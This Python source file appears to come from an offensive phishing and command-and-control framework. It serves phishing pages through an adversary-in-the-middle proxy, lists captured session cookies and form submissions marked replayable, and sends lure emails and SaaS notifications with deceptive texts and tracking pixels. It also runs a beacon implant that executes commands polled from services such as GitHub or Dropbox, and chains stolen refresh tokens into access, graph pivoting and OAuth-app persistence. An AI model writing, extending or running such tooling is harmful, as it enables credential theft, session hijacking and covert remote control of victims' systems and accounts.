# language: Python 3.11+, file: cf/cmds_delivery.py
# *delivery & c2 — serve, saaS notify providers, beacon loop, aitm chain*
from __future__ import annotations

import os

from typing import Any

from .cli_core import _as_list, _beacon_exec, _num, emit_json, err, ok, text
from .util import c_dim, json_dumps, new_token, resolve_secret, run_async


class DeliveryCommands:
    """Delivery group — composed into Cli (cf.cli); self.pos/flags/store and
    the dispatch helpers (_need/_feature/_campaign/_base) live there."""

    def cmd_serve(self) -> None:
        from .server import LandingServer

        server = LandingServer(
            self.store,
            host=str(self.flags.get("host", "127.0.0.1")),
            port=_num(self.flags, "port", 8080, int),
            base_url=str(self.flags.get("url", "")),
            filter_scanners=bool(self.flags.get("filter", False)),
            upstream=str(self.flags.get("upstream", "")),
            phishlet=str(self.flags.get("phishlet", "")),
        )
        run_async(
            server.serve_forever(
                ssl_certfile=self.flags.get("cert"),
                ssl_keyfile=self.flags.get("key"),
            )
        )

    # ─── outbound webhooks ───

    def cmd_webhook(self) -> None:
        self._need(2, "webhook add|list|remove <url>")
        action, url = self.pos[1].lower(), self.pos[2] if len(self.pos) > 2 else ""
        if action == "list":
            urls = self.store.list_webhooks()
            if not urls:
                text("  (no webhooks — webhook add <url>)")
                return
            for u in urls:
                text(f"  {u}")
            return
        if action == "add":
            if not url:
                raise SystemExit("webhook add <url>")
            try:
                self.store.add_webhook(url)
            except ValueError as exc:
                raise SystemExit(str(exc)) from None
            ok(f"webhook added: {url}")
            return
        if action == "remove":
            if not url:
                raise SystemExit("webhook remove <url>")
            if not self.store.remove_webhook(url):
                raise SystemExit(f"no such webhook: {url}")
            ok(f"webhook removed: {url}")
            return
        raise SystemExit(f"unknown action: {action}")

    # ─── captured proxy sessions ───

    def cmd_sessions(self) -> None:
        self._need(1, "sessions [--limit N]")
        rows = self.store.proxy_sessions(
            limit=_num(self.flags, "limit", 40, int)
        )
        if not rows:
            text("  (no captures — serve --upstream https://site.tld)")
            return
        for row in rows:
            payload = row["payload"]
            cookies = payload.get("cookies", {})
            head = ", ".join(
                f"{k}={str(v)[:18]}" for k, v in list(cookies.items())[:4]
            )
            icon = "🔑" if row["kind"] == "proxy:session" else "🍪"
            if row["kind"] == "proxy:form":
                body = str(payload.get("body", ""))[:80]
                text(
                    f"  ⌁ form  {payload.get('path', '')}  "
                    f"{body}  {c_dim(payload.get('ip', ''))}"
                )
                continue
            text(
                f"  {icon} {row['kind'].split(':')[-1]}  "
                f"{payload.get('host', '')}  [{head}]"
                f"{'  ✅ replayable' if row['kind'] == 'proxy:session' else ''}"
            )

    # ─── delivery ───


    def cmd_deliver(self) -> None:
        from .delivery import SaaSNotifyDelivery

        self._need(3, "deliver <provider> <campaign> [--token X] [--message M]")
        provider, ref = self.pos[1], self.pos[2]
        if provider == "smtp":
            self._deliver_smtp()
            return
        camp = self._campaign(ref)
        base = self._base(camp)
        if not base:
            raise SystemExit("--url required (or set it on the campaign)")
        token = resolve_secret(
            str(self.flags.get("token", "")), "SAAS_TOKEN", f"{provider} token: "
        )
        if not token:
            raise SystemExit("no provider token")
        message = str(
            self.flags.get(
                "message",
                "{label}: the attachment was blocked — open {url} to restore it",
            )
        )
        fields: dict[str, Any] = {}
        for item in _as_list(self.flags.get("field")):
            if "=" in str(item):
                k, v = str(item).split("=", 1)
                fields[k] = v
        rows = self.store.targets(camp["id"])
        if self.flags.get("only"):
            only = set(_as_list(self.flags["only"]))
            rows = [t for t in rows if t["token"] in only]
        targets = []
        for t in rows:
            payload = dict(fields)
            payload["message"] = message.format(
                label=t["label"] or t["email"] or "file",
                url=f"{base}/l/{t['token']}",
                token=t["token"],
            )
            payload["bid"] = t["token"]
            payload["channel_name"] = str(
                self.flags.get("channel", f"share-{t['token'][:6]}")
            )
            targets.append({"email": t["email"], **payload})
        if not targets:
            raise SystemExit("no targets")
        delivery = SaaSNotifyDelivery(
            self.store, camp["id"], provider, token
        )
        result = run_async(
            delivery.run_batch(targets, concurrency=int(self.flags.get("concurrency", 4)))
        )
        emit_json({k: v for k, v in result.items() if k != "results"})
        for r in result["results"]:
            if not r.get("result", {}).get("ok"):
                text(f"  fail {r.get('email')}: {r.get('result')}")
        outcome_by_email = {
            str(r["email"]): bool((r.get("result") or {}).get("ok"))
            for r in result["results"]
            if r.get("email")
        }
        for t in rows:
            delivered = outcome_by_email.get(str(t["email"]))
            if delivered is None:
                continue
            self.store.set_status(t["token"], "delivered" if delivered else "dead")
        ok("delivery finished")

    # ─── smtp profile delivery ───

    def cmd_sendprofile(self) -> None:
        from .smtp_send import TLS_MODES, SmtpProfile

        self._need(2, "sendprofile add|list|remove <name> [--host H --port P]")
        action = self.pos[1].lower()
        if action == "list":
            profiles = self.store.list_send_profiles()
            for entry in profiles:
                cfg = entry["config"]
                text(
                    f"  {entry['name']}  smtp://{cfg.get('user', '')}@"
                    f"{cfg.get('host', '')}:{cfg.get('port', '')} "
                    f"tls={cfg.get('tls', '')} from={cfg.get('sender', '')}"
                )
            if not profiles:
                text("  (no profiles — sendprofile add <name> --host H)")
            return
        self._need(3, f"sendprofile {action} <name>")
        name = self.pos[2]
        if action == "remove":
            removed = self.store.remove_send_profile(name)
            if not removed:
                raise SystemExit(f"no such profile: {name}")
            ok(f"profile removed: {name}")
            return
        if action != "add":
            raise SystemExit(f"unknown action: {action}")
        host = str(self.flags.get("host", ""))
        if not host:
            raise SystemExit("--host required")
        tls = str(self.flags.get("tls", "starttls"))
        if tls not in TLS_MODES:
            raise SystemExit(f"tls must be one of {TLS_MODES}")
        profile = SmtpProfile(
            host=host,
            port=_num(self.flags, "port", 587, int),
            user=str(self.flags.get("user", "")),
            sender=str(self.flags.get("from", "")),
            tls=tls,
        )
        self.store.set_send_profile(name, profile.to_config())
        ok(f"profile saved: {name} ({profile.host}:{profile.port} {profile.tls})")

    def _deliver_smtp(self) -> None:
        from .smtp_send import SmtpProfile, SmtpSender, build_message

        self._need(3, "deliver smtp <campaign> [--profile P | --host H]")
        camp = self._campaign(self.pos[2])
        base = self._base(camp)
        if not base:
            raise SystemExit("--url required (or set it on the campaign)")
        name = str(self.flags.get("profile", ""))
        profile: SmtpProfile | None = None
        if name:
            config = self.store.get_send_profile(name)
            if not config:
                raise SystemExit(f"no such profile: {name}")
            profile = SmtpProfile.from_config(config)
        else:
            host = str(self.flags.get("host", ""))
            if not host:
                raise SystemExit("--profile or --host required")
            profile = SmtpProfile(
                host=host,
                port=_num(self.flags, "port", 587, int),
                user=str(self.flags.get("user", "")),
                sender=str(self.flags.get("from", "")),
                tls=str(self.flags.get("tls", "starttls")),
            )
        password = resolve_secret(
            str(self.flags.get("pass", "")), "CF_SMTP_PASS", "smtp password: "
        )
        subject = str(
            self.flags.get(
                "subject", "{label}: shared document requires your approval"
            )
        )
        message = str(
            self.flags.get(
                "message",
                "Shared with you: <b>{label}</b><br>Open {url} to view.",
            )
        )
        fields: dict[str, Any] = {}
        for item in _as_list(self.flags.get("field")):
            if "=" in str(item):
                k, v = str(item).split("=", 1)
                fields[k] = v
        rows = self.store.targets(camp["id"])
        if self.flags.get("only"):
            only = set(_as_list(self.flags["only"]))
            rows = [t for t in rows if t["token"] in only]
        if not rows:
            raise SystemExit("no targets")
        sender = SmtpSender(profile, password)
        batch: list[tuple[str, Any]] = []
        tokens: list[str] = []
        for t in rows:
            token = t["token"]
            url = f"{base}/l/{token}"
            label = t["label"] or t["email"] or "file"
            body = str(message).format(label=label, url=url, token=token, **fields)
            subj = subject.format(label=label, url=url, token=token, **fields)
            batch.append(
                (
                    str(t["email"]),
                    build_message(
                        sender=profile.sender or profile.user or "share@example.com",
                        to=str(t["email"]),
                        subject=subj,
                        body=body,
                        pixel_url=f"{base}/t/{token}.gif",
                    ),
                )
            )
            tokens.append(token)
        outcome = sender.send_batch(batch)
        for token, to in zip(tokens, [b[0] for b in batch]):
            delivered = outcome.get(to, False)
            self.store.set_status(token, "delivered" if delivered else "dead")
            if delivered:
                self.store.record_hit(token, "smtp:send")
            self.store.log_event(
                token, camp["id"], "smtp:" + ("ok" if delivered else "fail"), to
            )
        ok(f"smtp delivery: {sum(outcome.values())}/{len(outcome)} sent")

    # ─── c2 beacon ───


    def cmd_beacon(self) -> None:
        from .c2 import LegitServiceC2, sign_command, verify_signed

        self._need(2, "beacon <service> --channel C [--token X] [--bid ID]")

        # beacon sign "<payload>" -> paste-ready signed command for the
        # channel; the implant only runs what verifies against the same key
        if self.pos[1] == "sign":
            if len(self.pos) < 3:
                raise SystemExit('beacon sign "<payload>"')
            key = resolve_secret(
                str(self.flags.get("sign", "")), "CF_C2_SIGN_KEY", "c2 signing key: "
            )
            if not key:
                raise SystemExit("no signing key (--sign or CF_C2_SIGN_KEY)")
            print("!" + sign_command(self.pos[2], key))
            return

        service = self.pos[1]
        channel = str(self.flags.get("channel", ""))
        if not channel and service not in ("github", "dropbox"):
            raise SystemExit("--channel required")
        token = resolve_secret(
            str(self.flags.get("token", "")), "C2_TOKEN", f"{service} token: "
        )
        if not token:
            raise SystemExit("no c2 token")
        bid = str(self.flags.get("bid") or new_token(8))
        c2 = LegitServiceC2(
            self.store,
            str(self.flags.get("campaign", "cli")),
            service,
            token,
            channel=channel,
            repo=str(self.flags.get("repo", "")),
            path=str(self.flags.get("path", "beacon.json")),
        )

        interval = _num(self.flags, "interval", 60, float)
        jitter = _num(self.flags, "jitter", 0.3, float)
        max_failures = _num(self.flags, "max-failures", 8, int)
        deadman_url = str(self.flags.get("deadman", ""))

        executor = _beacon_exec
        sign_key = str(self.flags.get("sign", "")) or os.environ.get(
            "CF_C2_SIGN_KEY", ""
        )
        if sign_key:
            def signed_exec(text: str) -> str:
                if not verify_signed(text, sign_key):
                    return "rejected: unsigned command"
                return _beacon_exec(text)

            executor = signed_exec
            ok("signed mode on — implant runs only commands via `beacon sign`")

        where = channel or str(self.flags.get("repo", "")) or "default"
        ok(f"beacon {bid} → {service}:{where} every {interval:g}s (ctrl-c to stop)")
        try:
            run_async(
                c2.run_beacon(
                    bid,
                    executor,
                    poll_interval=interval,
                    jitter=jitter,
                    max_failures=max_failures,
                    deadman_url=deadman_url,
                )
            )
        except KeyboardInterrupt:
            ok("beacon stopped")

    # ─── aitm ───


    def cmd_aitm(self) -> None:
        from .chain import AiTMEdgeChain

        if len(self.pos) < 2:
            err("aitm refresh|pivot|persist")
            raise SystemExit(2)
        sub = self.pos[1]
        chain = AiTMEdgeChain(self.store, str(self.flags.get("campaign", "cli")))

        def _emit(result: Any) -> None:
            print(json_dumps(result))
            if isinstance(result, dict) and result.get("error"):
                raise SystemExit(1)

        if sub == "refresh":
            if len(self.pos) < 4:
                raise SystemExit("aitm refresh <client_id> <refresh_token>")
            _emit(
                run_async(
                    chain.refresh_token_to_access(self.pos[2], self.pos[3])
                )
            )
        elif sub == "pivot":
            if len(self.pos) < 3:
                raise SystemExit("aitm pivot <access_token>")
            what = _as_list(self.flags.get("what")) or None
            _emit(run_async(chain.graph_pivot(self.pos[2], what)))
        elif sub == "persist":
            if len(self.pos) < 4:
                raise SystemExit("aitm persist <tenant> <access_token>")
            _emit(
                run_async(
                    chain.persist_oauth_app(self.pos[2], self.pos[3])
                )
            )
        else:
            err("aitm refresh|pivot|persist")
            raise SystemExit(2)

    # ─── extension ───
